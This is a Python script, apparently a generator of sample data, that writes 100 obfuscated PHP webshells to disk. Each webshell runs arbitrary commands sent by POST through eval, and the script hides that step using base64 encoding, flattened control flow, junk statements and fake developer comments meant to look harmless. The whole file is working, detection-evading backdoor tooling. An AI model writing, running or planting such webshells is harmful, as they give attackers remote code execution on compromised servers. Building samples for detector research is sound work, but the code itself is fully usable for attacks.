import os
import random
import string
import base64
from pathlib import Path
# 变异策略模块
def random_var(length=8):
    return ''.join(random.choices(string.ascii_letters, k=length))

def xor_encode(s, key=None):
    if key is None:
        key = random.randint(1, 255)
    return ','.join(str(ord(c) ^ key) for c in s), key

def fake_comment():
    fake_texts = [
        "TODO: Refactor this later",
        "HACK: Temporary workaround",
        "FIXME: Need to handle edge case",
        "Developer: anonymous",
        "This code is proprietary"
    ]
    return f"/* {random.choice(fake_texts)} */"

def insert_nop_or_junk_code():
    junk = [
        "$__junk__ = '{}';".format(random_var(12)),
        "if (false) {{ echo '{}'; }}".format(random_var(10)),
        "for ($i = 0; $i < 0; $i++) {{ echo $i; }}",
        "$_temp = array('{}');".format(random_var(5))
    ]
    return random.choice(junk)

def flatten_control_flow(payload):
    control_structure = f"""
$__cf__ = true;
while ($__cf__) {{
    switch(rand(1,1)) {{
        case 1:
            {payload}
            $__cf__ = false;
            break;
    }}
}}
"""
    return control_structure

def build_final_webshell():
    var_name = random_var()
    param_name = random.choice(["cmd", "x", "q", random_var(5)])
    code = f"eval($_POST['{param_name}']);"

    # 插入注释与 junk
    junk1 = insert_nop_or_junk_code()
    junk2 = insert_nop_or_junk_code()
    comment = fake_comment()

    # 控制流平展
    obfuscated_code = flatten_control_flow(code)

    # base64 编码再 eval
    encoded = base64.b64encode(obfuscated_code.encode()).decode()
    loader = f"{comment}\n{junk1}\n{junk2}\n${var_name} = base64_decode('{encoded}'); eval(${var_name});"

    return f"<?php\n{loader}\n?>"

def generate_webshell_samples_v8(num_samples=10):
    output_dir = Path("/data/php_webshellv8")
    output_dir.mkdir(parents=True, exist_ok=True)
    for i in range(num_samples):
        shell_code = build_final_webshell()
        filename = os.path.join(output_dir, f"webshell_{i+1}.php")
        with open(filename, "w") as f:
            f.write(shell_code)

# 示例调用
generate_webshell_samples_v8(num_samples=100)

